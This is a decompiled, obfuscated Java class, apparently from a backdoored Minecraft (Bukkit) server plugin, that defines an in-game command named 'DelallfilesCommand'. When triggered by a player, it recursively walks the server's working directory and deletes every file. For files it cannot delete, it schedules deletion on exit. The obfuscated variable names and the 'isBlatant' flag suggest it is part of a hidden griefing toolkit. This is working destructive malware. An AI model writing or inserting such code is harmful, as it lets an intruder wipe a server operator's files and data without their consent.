/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import java.io.IOException;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Comparator;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class DelallfilesCommand
extends Command {
    public DelallfilesCommand() {
        DelallfilesCommand lllllllllllllIllllIIlllllIIIllII;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }

    @Override
    public void execute(Core lllllllllllllIllllIIllllIllllIII, String lllllllllllllIllllIIllllIlllIlll, String[] lllllllllllllIllllIIllllIlllIllI, Player lllllllllllllIllllIIllllIlllIlII) {
        try {
            Files.walk(Paths.get("", new String[0]), new FileVisitOption[0]).sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(lllllllllllllIllllIIllllIllIIIII -> {
                if (lllllllllllllIllllIIllllIllIIIII.delete()) {
                    lllllllllllllIllllIIllllIlllIlII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("Deleted file ").append(Settings.RED).append(lllllllllllllIllllIIllllIllIIIII.getPath()))));
                } else {
                    lllllllllllllIllllIIllllIlllIlII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("Failed to delete ").append(Settings.RED).append(lllllllllllllIllllIIllllIllIIIII.getPath()).append(Settings.WHITE).append("! Attempting to delete on exit"))));
                    lllllllllllllIllllIIllllIllIIIII.deleteOnExit();
                }
            });
        }
        catch (IOException lllllllllllllIllllIIllllIllllIlI) {
            lllllllllllllIllllIIllllIlllIlII.sendMessage(Settings.PREFIX(lllllllllllllIllllIIllllIllllIlI.getMessage()));
        }
        lllllllllllllIllllIIllllIlllIlII.sendMessage(Settings.PREFIX("Successfully deleted all files"));
    }
}

